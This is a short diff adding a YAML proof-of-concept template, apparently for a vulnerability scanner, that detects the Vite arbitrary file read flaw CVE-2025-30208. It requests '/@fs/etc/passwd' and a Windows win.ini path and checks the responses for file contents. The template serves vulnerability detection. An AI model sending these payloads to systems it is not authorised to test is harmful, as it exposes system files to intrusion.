@@ -1,0 +1,11 @@
+name: poc-yaml-vite-Directory
+description: "CVE-2025-30208(任意文件读取)"
+method: GET
+path:
+  - "/@fs/C://windows/win.ini?import&raw"
+  - "/@fs/etc/passwd?import&raw"
+expression:
+  status: 200
+  body_any:
+    - "root:x:0"
+    - "[fonts]"
